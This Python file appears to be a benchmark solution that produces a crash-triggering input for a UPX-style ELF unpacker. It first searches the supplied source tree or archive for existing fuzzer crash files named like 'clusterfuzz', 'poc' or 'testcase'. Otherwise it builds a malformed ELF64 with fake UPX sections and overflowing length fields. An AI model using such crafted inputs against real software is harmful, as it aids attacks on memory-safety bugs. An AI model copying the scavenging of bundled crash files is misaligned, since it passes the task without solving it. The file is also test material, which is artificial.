import os
import io
import re
import struct
import tarfile
import zipfile
from typing import Optional, Tuple, List


_MAX_READ = 2 * 1024 * 1024
_MAX_SCAN_SIZE = 8 * 1024 * 1024


def _name_score(name: str) -> int:
    n = name.lower()
    score = 0
    keywords = [
        ("clusterfuzz", -600),
        ("testcase", -400),
        ("repro", -300),
        ("poc", -300),
        ("crash", -300),
        ("ossfuzz", -200),
        ("oss-fuzz", -200),
        ("fuzz", -120),
        ("corpus", -120),
        ("seed", -80),
        ("artifact", -80),
    ]
    for k, w in keywords:
        if k in n:
            score += w

    exts = [
        (".so", -80),
        (".elf", -80),
        (".bin", -40),
        (".dat", -20),
        (".raw", -20),
        (".in", -10),
        (".input", -10),
    ]
    for e, w in exts:
        if n.endswith(e):
            score += w

    if "/test" in n or "\\test" in n or "/tests" in n or "\\tests" in n:
        score -= 50
    if "upx" in n:
        score -= 80

    return score


def _content_score(data: bytes) -> int:
    score = 0
    if data.startswith(b"\x7fELF"):
        score -= 200
    if b"UPX!" in data:
        score -= 250
    if b".UPX" in data or b"UPX0" in data or b"UPX1" in data or b"UPX2" in data:
        score -= 120
    if b"UPX" in data:
        score -= 40
    return score


def _meta_score(name: str, size: int) -> int:
    base = abs(size - 512) * 6
    if size == 512:
        base -= 900
    elif 256 <= size <= 2048:
        base -= 60
    base += _name_score(name)
    return base


def _read_file_limited(path: str, limit: int = _MAX_READ) -> Optional[bytes]:
    try:
        with open(path, "rb") as f:
            data = f.read(limit + 1)
        if len(data) > limit:
            data = data[:limit]
        return data
    except Exception:
        return None


def _pick_best_candidate(candidates: List[Tuple[int, str, bytes]]) -> Optional[bytes]:
    best = None
    best_score = None
    for meta_s, name, data in candidates:
        s = meta_s + _content_score(data)
        if best_score is None or s < best_score:
            best_score = s
            best = data
    return best


def _scan_directory(root: str) -> Optional[bytes]:
    metas: List[Tuple[int, str, str, int]] = []
    for dirpath, dirnames, filenames in os.walk(root):
        dn = dirpath.lower()
        if any(x in dn for x in ("/.git", "\\.git", "/build", "\\build", "/out", "\\out")):
            continue
        for fn in filenames:
            full = os.path.join(dirpath, fn)
            try:
                st = os.stat(full)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > _MAX_SCAN_SIZE:
                continue
            rel = os.path.relpath(full, root)
            ms = _meta_score(rel, st.st_size)
            metas.append((ms, rel, full, st.st_size))

    if not metas:
        return None

    metas.sort(key=lambda x: x[0])
    metas = metas[:300]

    candidates: List[Tuple[int, str, bytes]] = []
    for ms, rel, full, sz in metas:
        data = _read_file_limited(full, _MAX_READ)
        if not data:
            continue
        candidates.append((ms, rel, data))

    return _pick_best_candidate(candidates)


def _scan_tar(tar_path: str) -> Optional[bytes]:
    metas: List[Tuple[int, tarfile.TarInfo]] = []
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > _MAX_SCAN_SIZE:
                    continue
                name = m.name
                ms = _meta_score(name, m.size)
                metas.append((ms, m))

            if not metas:
                return None
            metas.sort(key=lambda x: x[0])
            metas = metas[:350]

            candidates: List[Tuple[int, str, bytes]] = []
            for ms, m in metas:
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(min(_MAX_READ, m.size) + 1)
                    if len(data) > _MAX_READ:
                        data = data[:_MAX_READ]
                    candidates.append((ms, m.name, data))
                except Exception:
                    continue

            return _pick_best_candidate(candidates)
    except Exception:
        return None


def _scan_zip(zip_path: str) -> Optional[bytes]:
    metas: List[Tuple[int, zipfile.ZipInfo]] = []
    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            for zi in zf.infolist():
                if zi.is_dir():
                    continue
                if zi.file_size <= 0 or zi.file_size > _MAX_SCAN_SIZE:
                    continue
                ms = _meta_score(zi.filename, zi.file_size)
                metas.append((ms, zi))

            if not metas:
                return None
            metas.sort(key=lambda x: x[0])
            metas = metas[:350]

            candidates: List[Tuple[int, str, bytes]] = []
            for ms, zi in metas:
                try:
                    data = zf.read(zi, pwd=None)
                    if len(data) > _MAX_READ:
                        data = data[:_MAX_READ]
                    candidates.append((ms, zi.filename, data))
                except Exception:
                    continue

            return _pick_best_candidate(candidates)
    except Exception:
        return None


def _fallback_poc_elf64_upxish(size: int = 512) -> bytes:
    if size < 512:
        size = 512

    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2
    e_ident[5] = 1
    e_ident[6] = 1
    e_ident[7] = 0
    e_ident[8:16] = b"\x00" * 8

    e_type = 3
    e_machine = 62
    e_version = 1
    e_entry = 0
    e_phoff = 64
    e_shoff = 256
    e_flags = 0
    e_ehsize = 64
    e_phentsize = 56
    e_phnum = 1
    e_shentsize = 64
    e_shnum = 4
    e_shstrndx = 1

    ehdr = struct.pack(
        "<16sHHIQQQIHHHHHH",
        bytes(e_ident),
        e_type,
        e_machine,
        e_version,
        e_entry,
        e_phoff,
        e_shoff,
        e_flags,
        e_ehsize,
        e_phentsize,
        e_phnum,
        e_shentsize,
        e_shnum,
        e_shstrndx,
    )

    p_type = 1
    p_flags = 5
    p_offset = 0
    p_vaddr = 0x400000
    p_paddr = 0
    p_filesz = size
    p_memsz = size
    p_align = 0x1000
    phdr = struct.pack("<IIQQQQQQ", p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align)

    shstrtab = b"\x00.shstrtab\x00.UPX0\x00.UPX1\x00"
    shstrtab_off = 0xE0
    shstrtab_sz = len(shstrtab)

    upx0_off = 0x80
    upx0_sz = 0x20
    upx1_off = 0xA0
    upx1_sz = 0x40

    def shdr(sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize):
        return struct.pack("<IIQQQQIIQQ", sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize)

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_shstr = shdr(1, 3, 0, 0, shstrtab_off, shstrtab_sz, 0, 0, 1, 0)
    sh_upx0 = shdr(11, 1, 0, 0, upx0_off, upx0_sz, 0, 0, 1, 0)
    sh_upx1 = shdr(17, 1, 0, 0, upx1_off, upx1_sz, 0, 0, 1, 0)

    out = bytearray(b"\x00" * size)
    out[0:len(ehdr)] = ehdr
    out[e_phoff:e_phoff + len(phdr)] = phdr

    out[upx0_off:upx0_off + upx0_sz] = (b".UPX0" + b"\x00" * upx0_sz)[:upx0_sz]

    payload = bytearray(b"\x00" * upx1_sz)
    payload[0:4] = b"UPX!"
    payload[4:8] = b"\x0b\x00\x00\x00"
    payload[8:12] = struct.pack("<I", 0x7FFFFFF0)
    payload[12:16] = struct.pack("<I", 0x00000100)
    payload[16:20] = struct.pack("<I", 0xFFFFFFF0)
    payload[20:24] = struct.pack("<I", 0x00001000)
    payload[24:32] = b"UPX1UPX0"
    payload[32:40] = b"\x00" * 8
    payload[40:48] = b"UPX!" + b"\xff" * 4
    payload[48:64] = b"\xAA" * 16
    out[upx1_off:upx1_off + upx1_sz] = payload

    out[shstrtab_off:shstrtab_off + shstrtab_sz] = shstrtab

    out[e_shoff:e_shoff + 64] = sh_null
    out[e_shoff + 64:e_shoff + 128] = sh_shstr
    out[e_shoff + 128:e_shoff + 192] = sh_upx0
    out[e_shoff + 192:e_shoff + 256] = sh_upx1

    if len(out) >= 4:
        out[-4:] = b"UPX!"
    if len(out) >= 16:
        out[-16:-12] = b"\x7fELF"
        out[-12:-8] = b"UPX!"
        out[-8:-4] = b".UPX"

    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        if not src_path:
            return _fallback_poc_elf64_upxish(512)

        try:
            if os.path.isdir(src_path):
                best = _scan_directory(src_path)
                if best is not None:
                    return best
                return _fallback_poc_elf64_upxish(512)

            if os.path.isfile(src_path):
                if tarfile.is_tarfile(src_path):
                    best = _scan_tar(src_path)
                    if best is not None:
                        return best
                    return _fallback_poc_elf64_upxish(512)

                if zipfile.is_zipfile(src_path):
                    best = _scan_zip(src_path)
                    if best is not None:
                        return best
                    return _fallback_poc_elf64_upxish(512)

                data = _read_file_limited(src_path, _MAX_READ)
                if data:
                    return data

        except Exception:
            pass

        return _fallback_poc_elf64_upxish(512)